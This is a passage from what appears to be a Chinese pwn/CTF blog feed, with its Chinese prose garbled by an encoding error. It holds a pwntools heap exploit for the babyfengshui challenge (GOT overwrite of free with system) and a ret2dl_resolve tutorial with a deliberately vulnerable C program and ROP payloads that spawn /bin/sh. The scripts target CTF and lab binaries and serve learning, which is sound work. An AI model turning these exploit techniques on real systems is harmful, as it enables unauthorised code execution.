†å—äº†ã€‚å¹¶ä¸”gotè¡¨å¯å†™ï¼Œæˆ‘ä»¬æ˜¯é€šè¿‡æŒ‡é’ˆæ‰¾åˆ°descriptionçš„ï¼Œå¦‚æœæŠŠå®ƒæº¢å‡ºæ”¹æˆgotè¡¨çš„åœ°å€ï¼Œé‚£ä¹ˆåœ¨editçš„æ—¶å€™å°±å¯ä»¥ä¿®æ”¹gotè¡¨çš„æ¡ç›®äº†ã€‚é‚£ä¹ˆæˆ‘ä»¬ä¿®æ”¹å“ªä¸ªï¼ŸæŠŠfreeæ”¹æˆsystemï¼Œé‚£ä¹ˆåœ¨free(item-&gt;description)çš„æ—¶å€™å°±ä¼šå˜æˆsystem(item-&gt;description)ï¼Œå¦‚æœæŠŠitem-&gt;descriptionçš„å†…å®¹æ”¹æˆâ€/bin/shâ€ï¼Œé‚£ä¹ˆå°±å¯ä»¥æ„‰å¿«çš„getshelläº†ã€‚</p><p>è¿™ä¾¿æ˜¯åˆ†æelfæ–‡ä»¶å¾—åˆ°çš„ä¿¡æ¯ã€‚</p><h2 id="ç¼–å†™è„šæœ¬"><a href="#ç¼–å†™è„šæœ¬" class="headerlink" title="ç¼–å†™è„šæœ¬"></a>ç¼–å†™è„šæœ¬</h2><p>å…ˆæ„é€ äº¤äº’å‡½æ•°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conn</span>(<span class="params">x,file_name</span>):</span></span><br><span class="line">    <span class="keyword">if</span> x:p=process(file_name)</span><br><span class="line">    <span class="keyword">else</span>:p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25740</span>)</span><br><span class="line">    <span class="keyword">return</span> ELF(file_name),p</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">name,size,k,payload</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Action: &#x27;</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;description: &#x27;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;name: &#x27;</span>,name)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;length: &#x27;</span>,<span class="built_in">str</span>(k).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;text: &#x27;</span>,payload)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Action: &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Action: &#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,payload</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Action: &#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;length: &#x27;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(payload)).encode())</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;text: &#x27;</span>,payload)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œéœ€è¦ç‰¹åˆ«æ³¨æ„addå‡½æ•°ï¼Œå®ƒæœ‰ä¸¤ä¸ªé•¿åº¦è¾“å…¥ï¼Œä¸€ä¸ªæ˜¯descriptionçš„å †å—å¤§å°ï¼Œä¸€ä¸ªæ˜¯descriptionå†…å®¹çš„é•¿åº¦å¤§å°ã€‚è¿™ä¸ªnameå…¶å®æ²¡å¿…è¦å¼„ï¼Œå› ä¸ºåˆ©ç”¨ä¸åˆ°ï¼Œä½†æ˜¯æˆ‘è¿˜æ˜¯å¼„äº†ã€‚</p><p>é¦–å…ˆæ·»åŠ ä¸¤ä¸ª0x80å¤§å°descriptionçš„å †å—ï¼Œè¿™æ ·å¾—åˆ°äº†ä¸¤ä¸ª0x80å’Œ0x88çš„å¤§å †å—ã€‚freeæ‰ç¬¬ä¸€ä¸ªå †å—ï¼Œå› ä¸ºéƒ½ä¸å±äºfastbinèŒƒå›´çš„å †å—ï¼Œé‚£ä¹ˆå°±ä¼šåˆå¹¶æˆ0x108å¤§å°çš„å †å—ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥å¦‚æœæˆ‘å†ç”³è¯·ä¸€ä¸ª0x100å¤§å°çš„descriptionå°±ä¼šå¾—åˆ°è¿™ä¸ªfreeçš„å †å—ï¼Œé‚£ä¹ˆå°±å¯ä»¥åœ¨è¿™ä¸ªå †å—ä¸Šæº¢å‡ºç¬¬äºŒä¸ªå †å—äº†ã€‚</p><p>ä¸‹é¢æ˜¯æˆ‘çš„å®Œæ•´exp</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conn</span>(<span class="params">x,file_name</span>):</span></span><br><span class="line">    <span class="keyword">if</span> x:p=process(file_name)</span><br><span class="line">    <span class="keyword">else</span>:p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25740</span>)</span><br><span class="line">    <span class="keyword">return</span> ELF(file_name),p</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">name,size,k,payload</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Action: &#x27;</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;description: &#x27;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;name: &#x27;</span>,name)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;length: &#x27;</span>,<span class="built_in">str</span>(k).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;text: &#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Action: &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Action: &#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,payload</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Action: &#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;length: &#x27;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(payload)).encode())</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;text: &#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">elf,p=conn(<span class="number">0</span>,<span class="string">&#x27;./babyfengshui_33c3_2016&#x27;</span>)</span><br><span class="line">free_got=elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>,<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>,<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#add(b&#x27;a&#x27;,0x80,0x80,b&#x27;a&#x27;*0x10)</span></span><br><span class="line">add(<span class="string">b&#x27;/bin/sh\0&#x27;</span>,<span class="number">8</span>,<span class="number">8</span>,<span class="string">b&#x27;/bin/sh\0&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>,<span class="number">0x100</span>,<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line">edit(<span class="number">3</span>,<span class="number">0x10c</span>*<span class="string">b&#x27;b&#x27;</span>+p64(<span class="number">0x89</span>)+<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x80</span>+p32(<span class="number">0x81</span>)+p32(free_got))</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">free_addr=u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line">success(<span class="string">&#x27;free_addr&#x27;</span>+<span class="built_in">hex</span>(free_addr))</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">libc_addr=free_addr-libc.sym[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;libc_addr&#x27;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">sys=libc_addr+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,p32(sys))</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ret2dl_resolve</title>
      <link href="/2021/07/19/ret2dl_resolve/"/>
      <url>/2021/07/19/ret2dl_resolve/</url>
      
        <content type="html"><![CDATA[<p>æœ‰è¿™ä¹ˆä¸€ä¸ªæ¼æ´ï¼Œä»–èƒ½åœ¨ç¨‹åºä¸æä¾›ä»»ä½•è¾“å‡ºå‡½æ•°çš„æƒ…å†µä¸‹æ‰§è¡Œ<code>system(&quot;/bin/sh&quot;)</code>ï¼Œæ²¡é”™ï¼Œä»–å°±æ˜¯<code>ret2dl_resolve</code>ï¼Œè¿™ä¸ªæˆ‘ä¹Ÿè®¤ä¸ºæ˜¯æ ˆæº¢å‡ºçš„æœ€åä¸€å…³äº†ï¼Œå› æ­¤æˆ‘ç°åœ¨å°±ç®—æ˜¯æ ˆæº¢å‡ºæ¯•ä¸šäº†å§hhhhã€‚</p><span id="more"></span><p><code>elf</code>æ–‡ä»¶æˆ‘ä»¬è‡ªç»™è‡ªè¶³ï¼Œè‡ªå·±ç¼–è¯‘ï¼Œä¸ºäº†ä¸€æ­¥ä¸€æ­¥æ¼”ç¤ºï¼Œè¿˜æ˜¯ç»™äº†ä¸€ä¸ªè¾“å‡ºå‡½æ•°ï¼Œä½†æ˜¯æˆ‘ä»¬ä¸é€šè¿‡è¿™ä¸ªè¾“å‡ºå‡½æ•°å»æ³„éœ²<code>libc</code>çš„åœ°å€ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, buf);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">256</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">100</span>] = <span class="string">&quot;Welcome to the last stackoverflow&quot;</span>;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, buf);</span><br><span class="line">    <span class="built_in">puts</span>(buf);</span><br><span class="line">    vuln();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$gcc -g ret2dlresolve.c -o bof -no-pie -fno-<span class="built_in">stack</span>-protector -z relro -m32</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ç¼–è¯‘32ä½çš„åªå¼€NXä¿æŠ¤ç¨‹åºæµ‹è¯•ã€‚</p><h2 id="dl-runtime-resolveå‡½æ•°"><a href="#dl-runtime-resolveå‡½æ•°" class="headerlink" title="_dl_runtime_resolveå‡½æ•°"></a>_dl_runtime_resolveå‡½æ•°</h2><p><code>_dl_runtime_resolve</code>çš„åŸå‹æ˜¯<code>_dl_runtime_resolve(link_map,reloc_offset)</code>å‚æ•°<code>link_map</code>çš„å‚æ•°ä¼ å…¥åœ¨<code>reloc_offset</code>ä¹‹åï¼ˆæ ¹æ®32ä½å‡½æ•°è°ƒç”¨çº¦å®šï¼‰ï¼Œåœ¨åŠ¨æ€é“¾æ¥ä¸­ï¼Œæ‰€æœ‰å‡½æ•°çš„å»¶è¿Ÿç»‘å®šéƒ½éœ€è¦ç”¨è¿™ä¸ªå‡½æ•°å»å¯»å€ã€‚å¯»å€çš„æ—¶å€™eipä¼šåœ¨<code>plt[0]</code>ç„¶å<code>push got[1],jmp got[2]</code>ï¼Œ<code>got[1]</code>å°±æ˜¯<code>link_map</code>ï¼Œ<code>got[2]</code>å°±æ˜¯<code>dl_runtime_resolve</code>å‡½æ•°äº†ã€‚</p><p>å†æ¬¡è§£é‡Šä¸€éç¬¬ä¸€æ¬¡è°ƒç”¨å‡½æ•°çš„æµç¨‹ã€‚è°ƒç”¨è‚¯å®šæ˜¯ä»pltè¡¨çš„å¯¹åº”ä½ç½®è°ƒç”¨çš„ï¼Œpltè¡¨éƒ½ä¼šæŒ‡å‘gotè¡¨ä¸€ä¸ªåœ°å€ï¼Œgotè¡¨åœ¨æ²¡æœ‰è¢«å†™å…¥å‡½æ•°åœ°å€æ—¶ä¼š<code>push</code>ä¸€ä¸ª<code>reloc_arg</code>,ç„¶å<code>jmp plt[0]</code>ï¼Œ<code>plt</code>[0]æœ‰ä¸€æ®µæŒ‡ä»¤å°±æ˜¯å‹<code>got[1]</code>åšå‚æ•°ï¼Œç„¶å<code>jmp dl_runtime_resolve</code>ã€‚ç„¶åæ‹†å¼€è¿™ä¸ªå‡½æ•°ä¼šå‘ç°å®ƒå†…éƒ¨è°ƒç”¨äº†<code>_dl_fixup</code>å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°å°±æ˜¯ç”¨æ¥æ‰¾åœ°å€å’Œå›å†™<code>got</code>è¡¨çš„ã€‚</p><h2 id="æ§åˆ¶reloc-offsetå‚æ•°"><a href="#æ§åˆ¶reloc-offsetå‚æ•°" class="headerlink" title="æ§åˆ¶reloc_offsetå‚æ•°"></a>æ§åˆ¶reloc_offsetå‚æ•°</h2><p>å¯¹äºè¿™ä¸ªç¨‹åºï¼Œæˆ‘ä»¬å…ˆæŠŠæ ˆè¿ç§»åˆ°<code>.bss</code>æ®µä¸Šï¼Œç„¶ååœ¨è¿™ä¸ªæ®µä¸Šç²¾å¿ƒæ„é€ <code>payload</code>å°±å¯ï¼Œé¦–å…ˆæˆ‘ä»¬ç›´æ¥è°ƒç”¨<code>plt[0]</code>ï¼Œè‡ªå·±ä¼ <code>reloc_offset</code>å‚æ•°ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">proc=<span class="string">&#x27;./bof&#x27;</span></span><br><span class="line">elf=ELF(proc)</span><br><span class="line">p=process(proc)</span><br><span class="line">elf=ELF(proc)</span><br><span class="line"></span><br><span class="line">read=elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">bss=<span class="number">0x804c024</span><span class="comment">#readelf -S bofæŸ¥çœ‹æ‰€æœ‰çš„æ®µçš„åœ°å€</span></span><br><span class="line">ppp_ret=<span class="number">0x08049331</span><span class="comment">#ROPgadget</span></span><br><span class="line">leave_ret=<span class="number">0x08049145</span></span><br><span class="line">pop_ebp=<span class="number">0x08049333</span></span><br><span class="line">stack_size=<span class="number">0x400</span></span><br><span class="line">stack_start=bss+stack_size</span><br><span class="line">buf_size=<span class="number">0x6c</span>+<span class="number">4</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=flat(</span><br><span class="line"> buf_size*<span class="string">b&#x27;a&#x27;</span></span><br><span class="line">,p32(read)+p32(ppp_ret)<span class="comment">#å¼¹å‡ºä¸‰ä¸ªå‚æ•°</span></span><br><span class="line">,p32(<span class="number">0</span>)+p32(stack_start)</span><br><span class="line">,p32(<span class="number">100</span>)</span><br><span class="line">,p32(pop_ebp)<span class="comment">#æ ˆè¿ç§»</span></span><br><span class="line">,p32(stack_start)</span><br><span class="line">,p32(leave_ret)</span><br><span class="line">)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Welcome to the last stackoverflow&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">cmd=<span class="string">b&#x27;/bin/sh\0&#x27;</span></span><br><span class="line">reloc_arg=<span class="number">0x10</span></span><br><span class="line">plt_0=<span class="number">0x8049030</span></span><br><span class="line"></span><br><span class="line">payload=flat(</span><br><span class="line"> <span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span><span class="comment">#è¿™ä¸ªç»™leaveæŒ‡ä»¤åçš„pop ebpï¼Œå®é™…ä»ä¸‹é¢å¼€å§‹æ‰§è¡Œ</span></span><br><span class="line">,p32(plt_0)</span><br><span class="line">,p32(reloc_arg)</span><br><span class="line">,<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span></span><br><span class="line">,p32(stack_start+<span class="number">92</span>)</span><br><span class="line">)</span><br><span class="line">payload=payload.ljust(<span class="number">92</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload+=cmd</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/19/8Y72K69DTlsZ1PL.png" alt="ret2dl_resolve_1.png"></p><p>å¯ä»¥çœ‹åˆ°æˆ‘åœ¨æ²¡æœ‰ç›´æ¥è°ƒç”¨putsçš„æƒ…å†µä¸‹è¾“å‡ºäº†<code>/bin/sh</code>å­—ç¬¦ä¸²ã€‚</p><p>ä½†æ˜¯å¯ä»¥çœ‹åˆ°ï¼Œè¿™é‡Œçš„ç¬¬äºŒä¸ªå‚æ•°æ˜¯æˆ‘è‡ªå·±ä¼ çš„ï¼Œä¸ºä»€ä¹ˆæ˜¯<code>0x10</code>å‘¢ï¼Œ<code>0x10</code>æ˜¯<code>puts</code>å‡½æ•°çš„é‡å®šä½é¡¹åœ¨<code>.rel.plt</code>æ®µçš„åç§»ã€‚é‡å®šä½é¡¹æ˜¯è¿™ä¹ˆä¸€ä¸ªç»“æ„ä½“</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    Elf32_Addr r_offset; <span class="comment">// å…¶å®å°±æ˜¯gotè¡¨çš„åœ°å€</span></span><br><span class="line">    Elf32_Word r_info; <span class="comment">// ç¬¦å·è¡¨ç´¢å¼•ï¼Œé«˜ä¸‰ä¸ªå­—èŠ‚æŒ‡ç¤ºäº†putså‡½æ•°åœ¨.dynsymæ®µä¸Šçš„åç§»/16ã€‚</span></span><br><span class="line">    <span class="comment">//å› æ­¤å¾—å‡ºçš„åç§»å¿…é¡»è¢«16æ•´é™¤ã€‚</span></span><br><span class="line">&#125;Elf32_Rel;</span><br></pre></td></tr></table></figure><p>ç”±äºæˆ‘ä»¬æœ‰putså‡½æ•°ï¼Œæ‰€ä»¥<code>.rel.plt</code>æ®µä¸Šæœ‰ç°æˆçš„ç»“æ„ä½“ï¼Œæˆ‘ä»¬ç°åœ¨ä¸»è¦æ¥ä¼ªé€ <code>.rel.plt</code>é‡å®šä½é¡¹çš„ç»“æ„ä½“ã€‚</p><h2 id="ä¼ªé€ é‡å®šä½é¡¹"><a href="#ä¼ªé€ é‡å®šä½é¡¹" class="headerlink" title="ä¼ªé€ é‡å®šä½é¡¹"></a>ä¼ªé€ é‡å®šä½é¡¹</h2><p>æˆ‘ä»¬åªéœ€è¦æ”¹ç¬¬äºŒä¸ª<code>payload</code>å³å¯ã€‚</p><p>æˆ‘ä»¬åœ¨æ ˆä¸Šä¼ªé€ çš„é‡å®šä½é¡¹çš„åœ°å€</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fake_rel-.rel.plt_addr=reloc_offset</span><br></pre></td></tr></table></figure><p>payloadï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">rel_plt=<span class="number">0x8048388</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">fake_puts=flat(p32(puts_got),p32(<span class="number">0x307</span>))</span><br><span class="line">cmd=<span class="string">b&#x27;/bin/sh\0&#x27;</span></span><br><span class="line">reloc_arg=stack_start+<span class="number">20</span>-rel_plt</span><br><span class="line">plt_0=<span class="number">0x8049030</span></span><br><span class="line"></span><br><span class="line">payload=flat(</span><br><span class="line"> <span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span><span class="comment">#è¿™ä¸ªç»™leaveæŒ‡ä»¤åçš„pop ebpï¼Œå®é™…ä»ä¸‹é¢å¼€å§‹æ‰§è¡Œ</span></span><br><span class="line">,p32(plt_0)</span><br><span class="line">,p32(reloc_arg)</span><br><span class="line">,<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span></span><br><span class="line">,p32(stack_start+<span class="number">92</span>)</span><br><span class="line">,fake_puts</span><br><span class="line">)</span><br><span class="line">payload=payload.ljust(<span class="number">92</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload+=cmd</span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœï¼š</p><p><img src="https://i.loli.net/2021/07/19/3sXOio6cLwCQ2HN.png" alt="ret2dl_resolve_2.png"></p><h2 id="ä¼ªé€ ç¬¦å·"><a href="#ä¼ªé€ ç¬¦å·" class="headerlink" title="ä¼ªé€ ç¬¦å·"></a>ä¼ªé€ ç¬¦å·</h2><p>æ—¢ç„¶<code>r_info</code>æˆ‘ä»¬å¯ä»¥æ§åˆ¶ï¼Œè‡ªç„¶æˆ‘ä»¬ä¹Ÿèƒ½æŠŠå®ƒçš„åç§»æ”¹åˆ°æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„åœ°å€å½“ä¸­ï¼Œç„¶ååœ¨é‚£é‡Œä¼ªé€ ä¸€ä¸ªç¬¦å·ç»“æ„ä½“ã€‚</p><p>æˆ‘ä»¬æ¥çœ‹çœ‹ç¬¦å·<code>ELF32_Sym</code>çš„ç»“æ„ä½“</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    Elf32_Word st_name; <span class="comment">// Symbol name(string tbl index)</span></span><br><span class="line">    Elf32_Addr st_value; <span class="comment">// Symbol value</span></span><br><span class="line">    Elf32_word st_size; <span class="comment">// Symbol size</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> st_info; <span class="comment">// Symbol type and binding</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> st_other; <span class="comment">// symbol visibility under glibc&gt;=2.2</span></span><br><span class="line">    Elf32_Section st_shndx; <span class="comment">// Section index</span></span><br><span class="line">&#125;Elf32_Sym;</span><br></pre></td></tr></table></figure><p>ç„¶åæ„é€ å‡º<code>payload</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td 